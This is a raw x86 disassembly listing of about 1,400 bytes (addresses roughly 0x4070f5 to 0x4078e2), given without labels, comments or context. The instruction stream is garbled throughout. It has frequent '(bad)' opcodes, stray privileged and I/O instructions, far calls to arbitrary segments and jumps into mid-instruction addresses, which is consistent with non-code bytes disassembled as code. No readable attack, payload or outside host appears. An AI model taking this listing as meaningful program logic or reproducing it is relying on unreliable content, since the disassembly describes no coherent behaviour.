  4070f5:	mov    ebp,0xfccbf6df
  4070fa:	and    dl,BYTE PTR [eax]
  4070fc:	adc    bl,cl
  4070fe:	or     eax,0xe98a103e
  407103:	jns    0x407160
  407105:	retf   
  407106:	cli    
  407107:	repz pop ss
  407109:	bound  ebp,QWORD PTR [eax]
  40710b:	sub    al,0x51
  40710d:	mov    BYTE PTR [edx],dl
  40710f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407110:	pop    ds
  407111:	sub    esp,ebx
  407113:	push   cs
  407114:	(bad)  
  407115:	and    eax,0x83100128
  40711a:	enter  0xa4b3,0xc5
  40711e:	mov    esi,0x819c5fa2
  407123:	xchg   DWORD PTR [ebp+eiz*2-0x57],esi
  407127:	pop    esp
  407128:	mov    al,0x6f
  40712a:	sub    al,0x27
  40712c:	(bad)  
  40712d:	jae    0x40716b
  40712f:	je     0x4070d2
  407131:	sbb    DWORD PTR [edi-0x5e],edi
  407134:	js     0x407135
  407136:	mov    ecx,0x7dfdb993
  40713b:	mov    BYTE PTR [eax+0x64],dl
  40713e:	inc    esp
  40713f:	fs and eax,0x30384d9f
  407145:	stos   DWORD PTR es:[edi],eax
  407146:	clc    
  407147:	mov    ?,esi
  407149:	sbb    al,0xdb
  40714b:	push   0xffffffa2
  40714d:	sub    BYTE PTR gs:[ebp+0x4977d77b],al
  407154:	lods   eax,DWORD PTR ds:[esi]
  407155:	dec    ebp
  407156:	lods   al,BYTE PTR ds:[esi]
  407157:	dec    esi
  407158:	adc    eax,0x335ef40a
  40715d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715e:	sbb    BYTE PTR [edx-0x43],ah
  407161:	cmp    dh,0x74
  407164:	ins    DWORD PTR es:[edi],dx
  407165:	sub    edi,eax
  407167:	gs aam 0x1d
  40716a:	aam    0x8e
  40716c:	in     al,dx
  40716d:	sti    
  40716e:	push   ds
  40716f:	mov    ah,0xee
  407171:	repz cmp eax,0x8a9a5dd9
  407177:	adc    al,0x15
  407179:	fdivr  QWORD PTR [ebp-0x57]
  40717c:	(bad)  
  40717d:	mov    bh,0x8b
  40717f:	imul   eax,DWORD PTR [ebx],0x2e52a007
  407185:	push   es
  407186:	hlt    
  407187:	daa    
  407188:	or     al,0xea
  40718a:	popf   
  40718b:	stos   BYTE PTR es:[edi],al
  40718c:	inc    DWORD PTR [eax-0x4609e51e]
  407192:	imul   edx,DWORD PTR [edx-0x20e8eb9b],0x1c
  407199:	cdq    
  40719a:	out    dx,eax
  40719b:	xbegin 0xc96fb30a
  4071a1:	dec    edi
  4071a2:	es inc eax
  4071a4:	jle    0x407158
  4071a6:	push   esi
  4071a7:	push   ebp
  4071a8:	mov    cl,0x7f
  4071aa:	push   ecx
  4071ab:	call   0xed2a25f0
  4071b0:	scas   eax,DWORD PTR es:[edi]
  4071b1:	loopne 0x40719d
  4071b3:	pop    ss
  4071b4:	icebp  
  4071b5:	fwait
  4071b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b7:	in     eax,dx
  4071b8:	pop    ecx
  4071b9:	push   cs
  4071ba:	push   cs
  4071bb:	(bad)  
  4071bc:	xchg   ebx,eax
  4071bd:	push   edi
  4071be:	dec    esi
  4071bf:	sbb    DWORD PTR [edi-0x70],edx
  4071c2:	std    
  4071c3:	mov    ch,BYTE PTR [esp+edi*2-0x4f3dd15b]
  4071ca:	jecxz  0x4071bc
  4071cc:	frstor [edi+0x3e3176d1]
  4071d2:	loop   0x407249
  4071d4:	mov    cl,BYTE PTR [ecx+0x1affee74]
  4071da:	lods   eax,DWORD PTR ds:[esi]
  4071db:	jno    0x40716f
  4071dd:	and    eax,0x84a9304f
  4071e2:	add    esi,edi
  4071e4:	push   cs
  4071e5:	lods   al,BYTE PTR ds:[esi]
  4071e6:	or     al,dl
  4071e8:	fsub   QWORD PTR [edx+ebx*8+0x47]
  4071ec:	imul   esi,DWORD PTR [edx+0x75725cfb],0xffffffe1
  4071f3:	imul   ebx,DWORD PTR [eax-0x39],0x18
  4071f7:	adc    ecx,DWORD PTR [esi-0x22]
  4071fa:	push   ds
  4071fb:	sbb    BYTE PTR [edi-0x48],bh
  4071fe:	ror    al,1
  407200:	sub    DWORD PTR [ebp+ebx*8-0x5e1eff9a],edi
  407207:	dec    esi
  407208:	ret    
  407209:	loopne 0x4071e6
  40720b:	popf   
  40720c:	std    
  40720d:	mov    edi,0xb608219e
  407212:	adc    eax,DWORD PTR [edx]
  407214:	fimul  WORD PTR [ecx*8-0x723c1b76]
  40721b:	fcmovb st,st(2)
  40721d:	cli    
  40721e:	scas   al,BYTE PTR es:[edi]
  40721f:	repnz push esi
  407221:	jg     0x40727c
  407223:	jnp    0x407255
  407225:	int3   
  407226:	mov    esi,0x289c59fb
  40722b:	sub    ecx,ebx
  40722d:	fisub  DWORD PTR [eax]
  40722f:	pop    ds
  407230:	test   BYTE PTR [ecx+edx*4-0x56],ah
  407234:	sub    DWORD PTR [ebx-0x9],edi
  407237:	jns    0x40720c
  407239:	enter  0xe921,0x8c
  40723d:	int3   
  40723e:	shl    DWORD PTR [edx-0x21f5b476],1
  407244:	aam    0x6d
  407246:	mov    esi,0x85e03f05
  40724b:	jns    0x407211
  40724d:	dec    ecx
  40724e:	popf   
  40724f:	addr16 and eax,0xfb237b60
  407255:	inc    eax
  407256:	inc    esi
  407257:	xchg   ebx,eax
  407258:	adc    eax,0xdbc40dee
  40725d:	jo     0x40723c
  40725f:	push   0xffffff8a
  407261:	mov    eax,0xf01c3dfb
  407266:	push   cs
  407267:	or     eax,0x5e536ca
  40726c:	or     eax,0x28f9923f
  407271:	test   eax,0xd7eecd19
  407276:	mov    al,0x7e
  407278:	dec    DWORD PTR [eax-0x5fb63f1c]
  40727e:	mov    ebp,0xa48a1afb
  407283:	jb     0x4072cd
  407285:	iret   
  407286:	mov    ebp,DWORD PTR ds:0xc01ce9ed
  40728c:	or     al,0xc1
  40728e:	ficom  DWORD PTR [esi]
  407290:	fldenv [eax+0x19]
  407293:	scas   eax,DWORD PTR es:[edi]
  407294:	xlat   BYTE PTR ds:[ebx]
  407295:	outs   dx,BYTE PTR ds:[esi]
  407296:	mov    bh,0x8a
  407298:	sbb    edi,0x9aab9848
  40729e:	out    0x32,eax
  4072a0:	push   esi
  4072a1:	daa    
  4072a2:	mov    edi,0x825d8505
  4072a7:	imul   ebx,ebx,0x5b
  4072aa:	adc    bl,BYTE PTR [ecx+0x15b25b5c]
  4072b0:	cwde   
  4072b1:	jl     0x407277
  4072b3:	ret    0x6861
  4072b6:	shl    ebx,1
  4072b8:	test   eax,0xba4c2742
  4072bd:	retf   0xf342
  4072c0:	aam    0xfe
  4072c2:	sbb    dh,ch
  4072c4:	or     esp,DWORD PTR [eax+eiz*4-0x3977bdd3]
  4072cb:	cmp    DWORD PTR [edx],0x867a5635
  4072d1:	hlt    
  4072d2:	inc    esi
  4072d3:	loope  0x40725a
  4072d5:	mov    ecx,0x8e582076
  4072da:	inc    ebp
  4072db:	mov    esp,0x8b33573b
  4072e0:	scas   eax,DWORD PTR es:[edi]
  4072e1:	out    0xc6,al
  4072e3:	pop    eax
  4072e4:	sub    eax,0xfc939852
  4072e9:	add    eax,0x8fae8cac
  4072ee:	push   esp
  4072ef:	add    al,0x14
  4072f1:	and    DWORD PTR [eax+0x7cca2e71],esp
  4072f7:	jne    0x407310
  4072f9:	rol    BYTE PTR [ecx-0x38e8abc0],1
  4072ff:	fisub  DWORD PTR [ecx]
  407301:	push   ebx
  407302:	inc    eax
  407303:	adc    eax,0x7830f877
  407308:	cmc    
  407309:	call   DWORD PTR [bp+0x76]
  40730d:	ret    
  40730e:	cmp    BYTE PTR [esi+ebp*1+0x2482b984],cl
  407315:	xor    edi,edx
  407317:	mov    ds:0x89ca1d77,eax
  40731c:	adc    al,BYTE PTR [edx-0x12]
  40731f:	or     BYTE PTR [ecx-0x1950d7e0],ah
  407325:	in     al,0x6f
  407327:	mov    cl,0x3b
  407329:	aas    
  40732a:	ja     0x407332
  40732c:	mov    ecx,0xee4af768
  407331:	shr    DWORD PTR [edi+0x7a],cl
  407334:	jl     0x4072c7
  407336:	sbb    BYTE PTR ds:0xaeabf27e,ah
  40733c:	jmp    0x4072eb
  40733e:	jmp    0x4073a3
  407340:	stc    
  407341:	jge    0x4072d5
  407343:	stos   DWORD PTR es:[edi],eax
  407344:	imul   ebp,esi,0xffffffe4
  407347:	mov    dh,0x54
  407349:	mov    DWORD PTR [edi+0x8c9e00b],ebx
  40734f:	sub    BYTE PTR [eax+ebx*4+0xf],0x5e
  407354:	test   esi,edx
  407356:	ins    DWORD PTR es:[edi],dx
  407357:	sahf   
  407358:	cmp    dh,BYTE PTR [edx+0x2f11aff3]
  40735e:	sub    BYTE PTR [esi+0x3a],bh
  407361:	pop    ss
  407362:	sbb    al,0x54
  407364:	xor    eax,0x46dead81
  407369:	sub    al,0xb7
  40736b:	loope  0x4072ff
  40736d:	or     eax,0x6e3dc47c
  407372:	addr16 retf 
  407374:	jne    0x4073c6
  407376:	loopne 0x4073bc
  407378:	mov    al,ds:0xe2ef8a49
  40737d:	(bad)  
  40737e:	mov    eax,0xe6dd14df
  407383:	pop    ecx
  407384:	mov    eax,ds:0x62e89752
  407389:	dec    esi
  40738a:	and    BYTE PTR [ecx-0x185aedd8],al
  407390:	fwait
  407391:	jb     0x407367
  407393:	sub    DWORD PTR [ebx+0x2a],ebx
  407396:	inc    ebx
  407397:	push   ecx
  407398:	sub    dh,BYTE PTR [ebx-0x4c]
  40739b:	test   bl,al
  40739d:	pop    edi
  40739e:	pop    ebp
  40739f:	mov    BYTE PTR [edx-0x6],bh
  4073a2:	shr    BYTE PTR [esi+0x32c629ca],0x0
  4073a9:	cmc    
  4073aa:	dec    esp
  4073ab:	int    0xef
  4073ad:	or     al,0xa6
  4073af:	inc    esi
  4073b0:	retf   0x5415
  4073b3:	arpl   di,si
  4073b5:	jp     0x407379
  4073b7:	xchg   ebp,eax
  4073b8:	test   BYTE PTR [ebp+0x77],ch
  4073bb:	cmp    eax,0x536479d6
  4073c0:	xchg   DWORD PTR [esi-0x58a5c322],ebx
  4073c6:	stc    
  4073c7:	xchg   ebp,eax
  4073c9:	or     ebp,eax
  4073cb:	push   0xffffffa9
  4073cd:	stos   BYTE PTR es:[edi],al
  4073ce:	test   DWORD PTR [ecx+0x14927c9b],eax
  4073d4:	nop
  4073d5:	dec    ebx
  4073d6:	mov    eax,ds:0xb5525fdd
  4073db:	mov    bl,0x80
  4073dd:	dec    edx
  4073de:	mov    edx,DWORD PTR [eax+0x0]
  4073e1:	test   esp,esi
  4073e3:	push   edx
  4073e4:	repz xor DWORD PTR [ecx+0x7e],edx
  4073e8:	xor    ebp,DWORD PTR [edi-0x45903adb]
  4073ee:	mov    cl,0xf4
  4073f0:	ins    BYTE PTR es:[edi],dx
  4073f1:	sub    al,0x1
  4073f3:	ins    BYTE PTR es:[edi],dx
  4073f4:	jp     0x4073a0
  4073f6:	mov    ebx,0x170e0e44
  4073fb:	or     DWORD PTR es:[edi+ebx*4],edx
  4073ff:	bound  edi,QWORD PTR [ebx]
  407401:	fs xchg ebp,eax
  407403:	pop    ds
  407404:	popf   
  407405:	call   FWORD PTR [edx+0x54]
  407408:	retf   
  407409:	xchg   ebp,eax
  40740a:	dec    ebp
  40740b:	sbb    al,BYTE PTR [edx+0x633f5b04]
  407411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407412:	mov    es,WORD PTR [ecx-0x1e]
  407415:	add    DWORD PTR [ecx],0x7279f2fe
  40741b:	mov    ebx,0x6382727d
  407420:	retf   
  407421:	aad    0xfa
  407423:	lahf   
  407424:	mov    esi,0x231ab168
  407429:	mov    dh,0x73
  40742b:	jmp    0x407463
  40742d:	lods   al,BYTE PTR ds:[esi]
  40742e:	fwait
  40742f:	das    
  407430:	or     edx,ecx
  407432:	(bad)  
  407434:	retf   
  407435:	xchg   DWORD PTR [ecx],eax
  407437:	mov    esi,0x7e5dcf96
  40743c:	test   BYTE PTR es:[ecx+esi*8-0x645d2851],dh
  407444:	std    
  407445:	mov    esp,0xa2253c0f
  40744a:	mov    cl,0xf6
  40744c:	fdiv   DWORD PTR [edx-0x4f]
  40744f:	cmp    al,0x10
  407451:	(bad)  
  407452:	cmp    edx,DWORD PTR ds:0xcb044cfd
  407458:	dec    ebp
  407459:	push   ebp
  40745a:	mov    eax,ds:0x903bb2d6
  40745f:	cmp    eax,DWORD PTR [ebp+0x43]
  407462:	jg     0x40745f
  407464:	xor    dh,ch
  407466:	cmp    dl,dl
  407468:	jge    0x40744f
  40746a:	in     al,0x3f
  40746c:	inc    esi
  40746d:	call   0xa734308f
  407472:	push   esp
  407473:	and    ch,BYTE PTR [ebx]
  407475:	lods   eax,DWORD PTR ds:[esi]
  407476:	dec    ecx
  407477:	mov    ch,0x3d
  407479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40747a:	stos   BYTE PTR es:[edi],al
  40747b:	dec    esi
  40747c:	dec    edx
  40747d:	pop    es
  40747e:	inc    ecx
  40747f:	jnp    0x4074e2
  407481:	rcr    BYTE PTR [ebp-0x5a081d17],0x64
  407488:	stos   DWORD PTR es:[edi],eax
  407489:	loopne 0x4074d2
  40748b:	inc    ebp
  40748c:	sbb    BYTE PTR [ebx-0x6eab6574],dh
  407492:	sub    BYTE PTR [edx-0x3ba4faf],dl
  407498:	sbb    edx,DWORD PTR [esi-0x60]
  40749b:	push   ebp
  40749c:	dec    ebp
  40749d:	into   
  40749e:	ficom  WORD PTR [eax+0x7a]
  4074a1:	and    dl,BYTE PTR [ecx-0x2bfcec74]
  4074a7:	xchg   ebx,eax
  4074a8:	in     eax,0xff
  4074aa:	pop    edx
  4074ab:	inc    edi
  4074ac:	frstor [edx]
  4074ae:	pop    edx
  4074af:	ds (bad) 
  4074b2:	dec    ecx
  4074b3:	sar    DWORD PTR [edi],cl
  4074b5:	call   0x668f:0x592d6f46
  4074bc:	(bad)  
  4074bd:	enter  0x71a6,0x37
  4074c1:	mov    edx,esp
  4074c3:	bound  edx,QWORD PTR [edx-0x595f90bb]
  4074c9:	add    edx,DWORD PTR [esi-0xa04ad03]
  4074cf:	(bad)  
  4074d0:	loopne 0x4074a0
  4074d2:	mov    edx,0xc43d5375
  4074d7:	ficom  WORD PTR ds:0xfdc9abf7
  4074dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074de:	(bad)  es:[ebx]
  4074e1:	push   ebp
  4074e2:	loope  0x407555
  4074e4:	cmp    esi,DWORD PTR [ecx-0xc494a80]
  4074ea:	shl    di,cl
  4074ed:	push   esp
  4074ee:	mov    esp,0x306dbc09
  4074f3:	(bad)
  4074f6:	out    dx,al
  4074f7:	cmp    DWORD PTR [ecx+0x78],edx
  4074fa:	test   eax,0x950e03d5
  4074ff:	ins    BYTE PTR es:[edi],dx
  407500:	sub    DWORD PTR [ebp-0x596cd538],edi
  407506:	push   cs
  407507:	ins    DWORD PTR es:[edi],dx
  407508:	cli    
  407509:	mov    cl,ah
  40750b:	mov    eax,DWORD PTR [edx-0x45]
  40750e:	es dec esi
  407510:	push   0xe57b1cf7
  407515:	sbb    dh,BYTE PTR [edx+0x5]
  407518:	or     DWORD PTR [eax+0x5d9a7c3b],ecx
  40751e:	adc    BYTE PTR [edi],dl
  407520:	gs out 0xbd,al
  407523:	jecxz  0x4074d3
  407525:	push   edi
  407526:	xlat   BYTE PTR ds:[ebx]
  407527:	mov    ah,0x7a
  407529:	push   ebp
  40752a:	imul   ecx,DWORD PTR [edi],0xc6197cfa
  407530:	add    al,0x1e
  407532:	fisub  DWORD PTR [eax+0x39417594]
  407538:	jge    0x407551
  40753a:	outs   dx,BYTE PTR ds:[esi]
  40753b:	hlt    
  40753c:	scas   eax,DWORD PTR es:[edi]
  40753d:	aaa    
  40753e:	jmp    0x40750b
  407540:	out    dx,al
  407541:	mov    esp,0x93967ee6
  407546:	outs   dx,BYTE PTR ds:[esi]
  407547:	sbb    ch,bl
  407549:	test   DWORD PTR [edi],ecx
  40754b:	int3   
  40754c:	lds    ebp,FWORD PTR [edx]
  40754e:	inc    edi
  40754f:	inc    eax
  407550:	pusha  
  407551:	or     bh,al
  407553:	dec    ebp
  407554:	lods   al,BYTE PTR ds:[esi]
  407555:	xor    ebp,DWORD PTR [eax]
  407557:	xchg   esp,eax
  407558:	dec    ebx
  407559:	out    0xb2,al
  40755b:	cmp    edi,DWORD PTR [esi]
  40755d:	sub    ecx,DWORD PTR [eax]
  40755f:	cmp    al,0x24
  407561:	test   DWORD PTR [edi-0x2e],esp
  407564:	outs   dx,BYTE PTR cs:[esi]
  407566:	loopne 0x407590
  407568:	jbe    0x407568
  40756a:	call   0x17b6:0x9179915c
  407571:	or     ebp,DWORD PTR [esi-0x2c]
  407574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407575:	push   ecx
  407576:	stos   BYTE PTR es:[edi],al
  407577:	pushf  
  407578:	ss pop es
  40757a:	dec    ecx
  40757b:	jg     0x407596
  40757d:	pop    eax
  40757e:	lea    eax,[eax+0x3d5be54e]
  407584:	(bad)  
  407585:	imul   ecx,DWORD PTR [eax],0x7dd5798c
  40758b:	xor    ebp,DWORD PTR [edi-0x50]
  40758e:	jmp    0x675f:0x314a77f6
  407595:	cmp    eax,0x1707aa0d
  40759a:	addr16 or bh,bl
  40759d:	or     BYTE PTR [edx+0x1e7379f8],dl
  4075a3:	call   0xbe26:0x9b514e4b
  4075aa:	retf   0xa06f
  4075ad:	jl     0x407543
  4075af:	mov    esp,DWORD PTR [esi+0x15]
  4075b2:	add    eax,0x4c49771d
  4075b7:	add    DWORD PTR [esi+0x9e50658],0xa3b578e4
  4075c1:	scas   al,BYTE PTR es:[edi]
  4075c2:	add    BYTE PTR [ebp+0x7d],dh
  4075c5:	fwait
  4075c6:	scas   al,BYTE PTR es:[edi]
  4075c7:	data16 stc 
  4075c9:	std    
  4075ca:	rcl    DWORD PTR [edx+0x1b],cl
  4075cd:	icebp  
  4075ce:	addr16 stc 
  4075d0:	add    BYTE PTR [edi-0x7b],dh
  4075d3:	jnp    0x407640
  4075d5:	adc    DWORD PTR [esi],ebp
  4075d7:	mov    WORD PTR [ebx-0x7239001a],ds
  4075dd:	lods   al,BYTE PTR ds:[esi]
  4075de:	popa   
  4075df:	js     0x40764c
  4075e1:	adc    ebp,DWORD PTR [ebp-0x15]
  4075e4:	push   ecx
  4075e5:	mov    edi,es
  4075e7:	pusha  
  4075e8:	push   edx
  4075e9:	loop   0x407625
  4075eb:	mov    gs,WORD PTR [ecx]
  4075ed:	adc    al,0x93
  4075ef:	push   es
  4075f0:	scas   eax,DWORD PTR es:[edi]
  4075f1:	mov    ds:0xe65c3b2b,eax
  4075f6:	nop
  4075f7:	pop    ebp
  4075f8:	pop    es
  4075f9:	cwde   
  4075fa:	sbb    esp,DWORD PTR [ebx+ecx*1]
  4075fd:	xor    ch,BYTE PTR [edx-0x4fe7b791]
  407603:	iret   
  407604:	mov    bh,0x2d
  407606:	fisub  DWORD PTR [ebx+edx*8+0x6b5b8ae3]
  40760d:	mov    ebp,0x7bf95ce6
  407612:	xor    al,0x91
  407614:	xlat   BYTE PTR ds:[ebx]
  407615:	outs   dx,DWORD PTR ds:[esi]
  407616:	xor    DWORD PTR [di-0x4d9e],ecx
  40761b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40761c:	pop    edi
  40761d:	repz lock add esi,ebx
  407621:	or     DWORD PTR [edi+0x2695ed51],esi
  407627:	loop   0x40763d
  407629:	imul   esi,ebx,0x1e50dc6d
  40762f:	jb     0x4075e1
  407631:	scas   eax,DWORD PTR es:[edi]
  407632:	test   eax,0xd10bc81f
  407637:	hlt    
  407638:	sbb    al,0x14
  40763a:	retf   
  40763b:	call   0x82d0a559
  407640:	add    esi,edx
  407642:	xchg   DWORD PTR [esi-0x72],eax
  407645:	push   ds
  407646:	pusha  
  407647:	push   ecx
  407648:	or     DWORD PTR [ecx-0x52],0x12
  40764c:	xchg   BYTE PTR [bp+di],cl
  40764f:	inc    esi
  407650:	adc    DWORD PTR [ecx],edi
  407652:	test   DWORD PTR [eax+0x1d9b060b],0x40b191e2
  40765c:	or     edx,DWORD PTR [edi+0x21]
  40765f:	lods   eax,DWORD PTR ds:[esi]
  407660:	mov    al,ds:0x2e668c8d
  407665:	je     0x407670
  407667:	inc    ecx
  407668:	ror    DWORD PTR [ebp+0x13a72de0],0x1e
  40766f:	cli    
  407670:	sbb    eax,0xc722f505
  407675:	push   eax
  407677:	adc    esi,ebx
  407679:	xor    al,0x5c
  40767b:	jmp    0x152b:0x12a3e99e
  407682:	stc    
  407683:	int3   
  407684:	dec    ebp
  407685:	sar    BYTE PTR [ecx-0x3d],0xa
  407689:	jl     0x4076ae
  40768b:	shr    DWORD PTR [eax],1
  40768d:	call   0x371666a1
  407692:	in     eax,0xe9
  407694:	arpl   WORD PTR [ebx+0x6d2900d],bp
  40769a:	xor    al,0xe9
  40769c:	inc    edx
  40769d:	sub    eax,DWORD PTR [ebp+0x9]
  4076a0:	mov    bh,0x77
  4076a2:	cdq    
  4076a3:	shr    BYTE PTR [ecx-0x46056e30],1
  4076a9:	xchg   ebx,eax
  4076aa:	sbb    eax,0x562854b8
  4076af:	test   BYTE PTR [ebx],dl
  4076b1:	popf   
  4076b2:	and    eax,eax
  4076b4:	mov    dl,BYTE PTR [eax-0x30]
  4076b7:	sub    al,0x58
  4076b9:	mov    ch,0xfc
  4076bb:	push   ss
  4076bc:	mov    al,ds:0x32353bed
  4076c1:	adc    DWORD PTR [eax+0x268cb2eb],0xffffff94
  4076c8:	or     BYTE PTR [edi],al
  4076ca:	retf   0xffb3
  4076cd:	push   edx
  4076ce:	inc    edx
  4076cf:	cwde   
  4076d0:	enter  0xd57f,0x9d
  4076d4:	mov    dh,0x12
  4076d6:	push   DWORD PTR [ecx]
  4076d8:	stos   BYTE PTR es:[edi],al
  4076d9:	mov    ah,0xf
  4076db:	jmp    0x5b538643
  4076e0:	and    cl,ch
  4076e2:	and    eax,0xbd67839b
  4076e7:	push   eax
  4076e8:	dec    ecx
  4076e9:	mov    ch,0x6d
  4076ec:	daa    
  4076ed:	retf   
  4076ee:	jnp    0x40768c
  4076f0:	and    BYTE PTR [eax+0x3ade1737],0x67
  4076f7:	aaa    
  4076f8:	fild   QWORD PTR [ebp-0x3c]
  4076fb:	pusha  
  4076fc:	stc    
  4076fd:	xor    al,0xf6
  4076ff:	pusha  
  407700:	sbb    eax,0xa8e3b32b
  407705:	sub    bl,bl
  407707:	dec    esi
  407708:	icebp  
  407709:	repnz mov ?,ecx
  40770c:	or     eax,0x9f8b0498
  407711:	js     0x40770a
  407713:	mov    cl,0x12
  407715:	sbb    al,0x2e
  407717:	xor    BYTE PTR [ecx],ah
  407719:	ja     0x4076b7
  40771b:	test   ecx,ebp
  40771d:	cwde   
  40771e:	push   esi
  40771f:	popf   
  407720:	sbb    dh,0x6e
  407723:	or     ah,BYTE PTR [edx+0xf]
  407726:	push   0xcc288cf6
  40772b:	out    dx,al
  40772c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40772d:	je     0x4076bf
  40772f:	out    0xcb,al
  407731:	std    
  407732:	ret    
  407733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407734:	dec    ecx
  407735:	and    al,0xdb
  407737:	ret    0x8563
  40773a:	loop   0x407778
  40773c:	sar    BYTE PTR [edi+0x43],0xaf
  407740:	jnp    0x407797
  407742:	das    
  407743:	push   edx
  407744:	xor    DWORD PTR [eax+0x16dfbacd],0xbfe664cf
  40774e:	pop    edx
  40774f:	adc    al,0x40
  407751:	pusha  
  407752:	out    0xe6,al
  407754:	arpl   WORD PTR [ebx],dx
  407756:	loop   0x407758
  407758:	and    ax,0xccf
  40775c:	xor    DWORD PTR [ebx-0x461e175c],esi
  407762:	and    eax,0x4ea59f2f
  407767:	in     al,dx
  407768:	shl    DWORD PTR [esp],cl
  40776b:	scas   al,BYTE PTR es:[edi]
  40776c:	ja     0x407764
  40776e:	or     dh,BYTE PTR [ebp+ecx*8-0x4c]
  407772:	xchg   edx,eax
  407773:	mov    bl,cl
  407775:	xor    DWORD PTR [ebx],esi
  407777:	std    
  407778:	sar    BYTE PTR [esi+0x7303ca01],1
  40777e:	mov    dh,0xe4
  407780:	jne    0x407716
  407782:	mov    DWORD PTR [ecx+0x2b],ebx
  407785:	neg    esp
  407787:	sbb    bh,al
  407789:	outs   dx,DWORD PTR ds:[esi]
  40778a:	pusha  
  40778b:	xchg   BYTE PTR [edi+0x66],ah
  40778e:	xchg   ebx,eax
  40778f:	mov    ah,0x8e
  407791:	mov    ebp,0x284b597a
  407796:	dec    BYTE PTR [esi]
  407798:	test   BYTE PTR [ebx+eiz*8+0x6a],dl
  40779c:	push   edi
  40779d:	cdq    
  40779e:	push   ss
  40779f:	jnp    0x4077a5
  4077a1:	sub    al,0x62
  4077a3:	mov    ecx,0xe5634d6e
  4077a8:	sti    
  4077a9:	cmp    DWORD PTR [eax-0x45605c3d],0x275fe273
  4077b3:	enter  0x703,0xcb
  4077b7:	in     eax,dx
  4077b8:	js     0x407805
  4077ba:	push   0x3da9be2e
  4077bf:	xchg   edx,eax
  4077c0:	pushf  
  4077c1:	or     ebp,DWORD PTR [esi+0x1a]
  4077c4:	sub    BYTE PTR [esi-0x252cbbc7],bh
  4077ca:	push   ebx
  4077cb:	push   ecx
  4077cc:	fsub   QWORD PTR [ebp+0x5c]
  4077cf:	repz or BYTE PTR [edx],ch
  4077d2:	jecxz  0x407843
  4077d4:	lds    edx,FWORD PTR ds:0x6964c85e
  4077da:	das    
  4077db:	test   al,0x37
  4077dd:	mov    ah,0xde
  4077df:	mov    dh,0x4c
  4077e1:	(bad)  
  4077e2:	mov    esp,0x77c71bd3
  4077e7:	fld    TBYTE PTR [eax]
  4077e9:	inc    ch
  4077eb:	outs   dx,DWORD PTR ds:[esi]
  4077ec:	mov    bl,ah
  4077ee:	es cmc 
  4077f0:	push   ebp
  4077f1:	push   cs
  4077f2:	(bad)  
  4077f3:	sbb    eax,0x4c58b4a1
  4077f8:	test   BYTE PTR [edx],ch
  4077fa:	cld    
  4077fb:	sahf   
  4077fc:	and    bl,BYTE PTR [eax]
  4077fe:	mov    edx,0x71a98f17
  407803:	or     al,0xe2
  407805:	in     eax,0x78
  407807:	into   
  407808:	push   edi
  407809:	mov    eax,ds:0xcd3d9c0b
  40780e:	inc    eax
  40780f:	cmp    dl,BYTE PTR [ebp-0x2a2ea331]
  407815:	dec    ebx
  407816:	test   ebp,0xe4a56674
  40781c:	cmp    al,0x9
  40781e:	jg     0x40785b
  407820:	cmc    
  407821:	add    DWORD PTR [eax],edx
  407823:	cdq    
  407824:	pop    ds
  407825:	dec    edx
  407826:	xchg   edx,eax
  407827:	lods   eax,DWORD PTR ds:[esi]
  407828:	or     al,BYTE PTR [ebp+0x0]
  40782b:	rcr    BYTE PTR [edi+0x46],cl
  40782e:	push   0x6c923d98
  407833:	(bad)  
  407834:	(bad)  
  407835:	loope  0x40788b
  407837:	sbb    eax,0x616479e3
  40783c:	sub    eax,0xea0708d3
  407841:	add    eax,0x8b433e21
  407846:	adc    DWORD PTR [ecx],0xec75093b
  40784c:	nop
  40784d:	shl    DWORD PTR [eax+0x2f],cl
  407850:	xchg   DWORD PTR [edi+0x74],edi
  407853:	dec    ebp
  407854:	leave  
  407855:	js     0x40786e
  407857:	push   esi
  407858:	or     esp,edx
  40785a:	or     ebx,DWORD PTR [edi]
  40785c:	gs pop edi
  40785e:	pop    es
  40785f:	pop    eax
  407860:	cmc    
  407861:	sbb    DWORD PTR [ecx-0x6dd421d9],esp
  407867:	mov    bh,BYTE PTR [edi+0x50fbebb4]
  40786d:	mov    DWORD PTR [ebx-0x34f50a17],esi
  407873:	sbb    DWORD PTR [esi-0x34],ebp
  407876:	div    DWORD PTR [eax]
  407878:	and    eax,edi
  40787a:	je     0x40789a
  40787c:	mov    bl,dl
  40787e:	push   0x41
  407880:	sub    eax,0x93f9f82e
  407885:	stos   BYTE PTR es:[edi],al
  407886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407887:	jne    0x4078ac
  407889:	push   0x41
  40788b:	push   es
  40788c:	ins    BYTE PTR es:[edi],dx
  40788d:	enter  0xa37e,0x34
  407891:	loope  0x407878
  407893:	icebp  
  407894:	std    
  407895:	es mov eax,0xa78cc7a8
  40789b:	mov    edi,0x3cd316c2
  4078a0:	int3   
  4078a1:	xchg   esi,eax
  4078a2:	ror    DWORD PTR [edx],0x6d
  4078a5:	int    0x80
  4078a7:	jbe    0x4078fa
  4078a9:	lods   eax,DWORD PTR ds:[esi]
  4078aa:	jb     0x4078e8
  4078ac:	repnz xchg edi,eax
  4078ae:	xchg   edx,eax
  4078af:	pop    ebp
  4078b0:	or     eax,0x2e2280e
  4078b5:	fchs   
  4078b7:	lods   eax,DWORD PTR ds:[esi]
  4078b8:	stos   BYTE PTR es:[edi],al
  4078b9:	and    DWORD PTR ds:0x812ac2d9,edi
  4078bf:	adc    DWORD PTR [ecx],ebp
  4078c1:	cmp    DWORD PTR [edx+0x693552ee],0x3ffc22a0
  4078cb:	xchg   esi,eax
  4078cc:	push   esp
  4078cd:	cmp    ebx,edx
  4078cf:	test   DWORD PTR [ebp+0x7],0xc7b7f276
  4078d6:	dec    ecx
  4078d7:	cwde   
  4078d8:	mov    cl,0x41
  4078da:	scas   eax,DWORD PTR es:[edi]
  4078db:	(bad)  
  4078dc:	lods   al,BYTE PTR ds:[esi]
  4078dd:	jmp    0xbfb7aaed
  4078e2:	cmp    edx,DWORD PTR [edi]
